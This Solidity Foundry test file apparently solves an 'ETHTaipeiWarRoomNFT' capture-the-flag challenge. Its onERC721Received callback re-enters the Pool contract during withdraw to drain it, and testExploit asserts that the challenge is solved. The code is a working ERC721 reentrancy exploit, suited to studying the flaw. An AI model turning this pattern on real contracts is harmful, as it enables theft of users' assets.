// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.8.0;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {Pool} from "src/ETHTaipeiWarRoomNFT/Pool.sol";
import {WarRoomNFT} from "src/ETHTaipeiWarRoomNFT/NFT.sol";

contract PoolTest is Test {
    Pool public pool;
    WarRoomNFT public nft;
    uint256 times = 0;
    uint256 _tokenId;

    function setUp() public {
        nft = new WarRoomNFT();
        pool = new Pool(address(nft));
        _tokenId = nft.mint(address(this));
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) external returns (bytes4) {
        if (times < 1) {
            times++;
            nft.safeTransferFrom(address(this), address(pool), 1);
            pool.withdraw(tokenId);
        }
        return this.onERC721Received.selector;
    }

    function testExploit() public {
        nft.approve(address(pool), _tokenId);
        pool.deposit(_tokenId);
        pool.withdraw(_tokenId);
        assertEq(pool.isSolved(), true);
    }
}
